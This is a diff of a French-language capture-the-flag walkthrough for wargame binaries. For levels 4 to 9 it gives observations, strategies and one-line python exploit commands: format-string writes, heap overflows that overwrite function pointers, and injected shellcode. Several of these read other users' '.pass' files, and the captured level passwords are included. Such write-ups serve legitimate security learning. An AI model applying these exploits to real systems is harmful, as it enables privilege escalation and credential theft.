@@ -187,9 +187,6 @@ level4:
 		Changer la memoire en plusieurs parties pour que la chaine de carateres necessaire soit repartie sur les differents octets.
 		Dans notre cas en 3 parties: AD+0 AD+1 AD+2 FIL1 %N FIL2 %N FIL3 %N
 
-	tentative:
-		python -c "print('\x8c\x98\x04\x08' + 'E'*(64 - 23) + '%x'*3 + '%n')" | ./level4
-
 	solution:
 		python -c "print('\x10\x98\x04\x08' + '\x11\x98\x04\x08'+ '\x12\x98\x04\x08' + '%46.c' + '%c'*10 + '%n' + 'H'*17 + '%n' + 'T'*173 + '%n')" | ./level4
 
@@ -210,6 +207,7 @@ level5:
 
 	strategie:
 		modifier l'operation de saut de la fonction d'appel cour <exit> pour pointer vers la fonction <o> 		
+		Je vais modifier l'addresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'addresse de la fonction <o>
 
 	cmd gdb:
 		p o
@@ -219,11 +217,7 @@ level5:
 		 |
 		 `-> La premiere ligne de la fonction ressemble a ca : (jmp *0x8049838)
 
-
 	solution:
-		Je vais modifier l'addresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'addresse de la fonction <o>
-
-	cmd:
 		(python -c "print('\x38\x98\x04\x08' + 'A'*4 + '\x39\x98\x04\x08' + 'A'*4 + '\x3a\x98\x04\x08' + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
 
 	pass:
@@ -236,11 +230,11 @@ level6:
 		Il y a deux mallocs a la suite dans la fonction, ensuite le contenue du premier malloc est ecraser par la valeur de argv[1] avec la fonction strcpy.
 		Ensuite la valeur de dereferencement du resultat du deuxiemee malloc est execute en tant que fonction.
 	
-	solution:
+	strategie:
 		Nous cherchons le decalage dans la memoire entre les deux mallocs.
 		Ensuite nous faisons un buffer overflow de ce decalage pour ecraser la valeur laquelle est pointee par le deuxieme malloc.
 
-	commande:
+	solution:
 		./level6 $(python -c "print ('a' * 72 + '\x54\x84\x04\x08' + '\x00')")
 	
 	pass:
@@ -256,7 +250,7 @@ level7:
 		Ensuite un fget ouvre le fichier '.pass' de l'utilisateur 'level8' et le stock dans la chaine c qui est global.
 		Par la suite un appel a puts est effectue.
 
-	solution:
+	strategie:
 		Je vais overflow dans le premier strcpy pour ecraser l'addresse dans le malloc numero 2 aevc l'addresse visee par la fonction puts.
 		Ensuite je vais mettre l'addresse de la fonction <m> qui affiche la chaine c.
 
@@ -266,7 +260,7 @@ level7:
 		malloc:2	= 0x804a018
 		malloc:3	= 0x804a028
 
-	commande:
+	solution:
 		./level7 $(python -c "print('A'*(16 + 4) + '\x28\x99\x04\x08')") $(printf '\xf4\x84\x04\x08')
 
 	pass:
@@ -275,14 +269,68 @@ level7:
 
 level8:
 
-	bonne commande:
-		(echo $(printf "auth \xe8\x9f\x04\x08"); echo $(echo "login"); echo $(echo "cat /home/user/level9/.pass")) | ./level8
+	observations:
+		A FAIRE
+
+	strategie:
+		A FAIRE
+
+	solution:
+		(printf "auth \nservicR0123456789abcdef\nlogin\n"; echo $(echo "cat /home/user/level9/.pass")) | ./level8
+
+	pass:
+		c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+
+
+level9:
+
+	observations:
+		A FAIRE
+
+	strategie:
+		A FAIRE
+	
+	commandes gdb:
+		(gdb) info address system
+			Symbol "system" is at 0xb7d86060 in a file compiled without debugging.
+
+			Breakpoint 1, 0x0804861c in main ()
+		(gdb) x $eax
+			0x804a008:      0x00000000
 		
+			Breakpoint 2, 0x0804863e in main ()
+		(gdb) x $eax
+			0x804a078:      0x00000000
+
+		(gdb) run test
+			Starting program: /home/user/level9/level9 test
+
+	observations:
+		Apres analyse dans gdb l'addresse de la fonction <system> de mon injection change a l'execution:
+		Elle passe de 0xb7d86060 a 0xbfdd0097.
+		Je calcule donc le decalage et l'applique a la fonction injectee.
+		0xbfdd0097 - 0xb7d86060 = 0x804a037
+		0xb7d86060 - 0x804a037 = 0xafd3c029
+
+	solution:
+		/home/user/level9/level9 $(python -c "print('\x11\xa0\x04\x08'  + '\x55\x89\xe5\x83\xec\x28\xc6\x45\xf5\x73\xc6\x45\xf6\x68\xc6\x45\xf7\x01\x0f\xb6\x45\xf7\x83\xe8\x01\x88\x45\xf7\x8d\x45\xf5\x89\x04\x24\xe8\x29\xc0\xd3\xaf\xc9\xc3' + 'A'*(112 - 4 - 4 - 41) + '\x0c\xa0\x04\x08')") <<< "cat /home/user/bonus0/.pass"
+
+	pass:
+		f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728		A FAIRE
+
+
+bonus0:
+
+	observation:
+		Nous avons trois fonctions: <main>, <pp>, <p>.
+		La fonction <main> execute la fonction <pp>.
+
+
 
 
 NOTES:
 
-	execute on exit: (solution)
+	execute on exit:
 		https://book.hacktricks.xyz/binary-exploitation/arbitrary-write-2-exec/www2exec-atexit
 
 	exit handlers abuse:
